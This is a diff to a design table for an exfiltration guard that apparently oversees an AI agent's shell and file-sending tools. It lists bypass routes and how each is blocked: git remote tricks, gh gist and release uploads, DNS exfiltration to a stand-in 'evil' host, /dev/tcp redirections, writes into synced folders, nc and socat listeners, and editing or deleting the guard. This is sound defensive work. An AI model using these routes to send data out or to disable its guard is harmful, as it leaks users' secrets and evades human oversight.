@@ -96,13 +96,16 @@ keep working when any of those rules is changed.
 | `curl -x proxy`, `--resolve`, `-K config` | block |
 | `git remote set-url` then `git push origin` | set-url blocked; push checks the pinned `host/owner/repo` |
 | Editing `.git/config` with the Write tool, then pushing | push still checks the pin → block |
-| `git -c remote.origin.url=… push`, `git -C /other push`, `--receive-pack=` | block |
+| `git -c remote.origin.url=… push`, `git -C /other push`, `--git-dir`/`--work-tree`, `--receive-pack=` | block |
+| `git -C <dir>` inside this project's work tree | followed like a `cd`; a push from there still faces the pin check. More than one `-C` blocks |
 | `cd /other/clone && git push origin` | effective directory tracked; pin check applies there |
 | `gh api -f`, `gh gist`, `gh release upload`, `gh pr create --body-file` | block |
 | `gh pr create --body "$(cat secret)"` | substitution on a `gh` line → block |
 | DNS exfiltration (`dig data.evil`, `$(cat s).evil`) | probe tools need a lab host; substitution blocks |
 | `/dev/tcp` bash redirections | regex on the raw text |
-| `cp` into iCloud/Dropbox/OneDrive/`/Volumes` | block |
+| `cp`/`mv`/`rsync`/`tee`/`dd`/`tar`/`zip`/`ln`/`install`/`ditto` writing into iCloud/Dropbox/OneDrive/`/Volumes` | block — the destination operand (`-t`, `of=`, `tar -C` when extracting, `tar -f` when creating, the zip archive) is what is checked |
+| Reading from such a folder (`cp /Volumes/USB/f .`, `cat`, `dd if=`, `tar -cf out.tar /Volumes/…`) | allowed; only a write into one is an upload |
+| A copy tool option the guard does not recognize, or `unzip`/`gzip`/`bzip2`/`xz` | destination cannot be identified → any synced/volume path among the arguments blocks |
 | `python -m http.server`, `nc -l`, `socat …-LISTEN`, `php -S` | serving is exposing → block |
 | Editing the allowlist during the session | the allowlist is read from `HEAD`, never the working tree — the edit has no effect until a human commits it |
 | Deleting, unregistering or editing the guard | `guard-enforcement-files.sh` announces the edit; `verify-exfiltration-guard.sh` fails CI when a guard file is missing from `HEAD`, when the registration no longer covers `Artifact`, `SendUserFile` and `Bash`, or when either changed between the merge base with the base branch and HEAD |
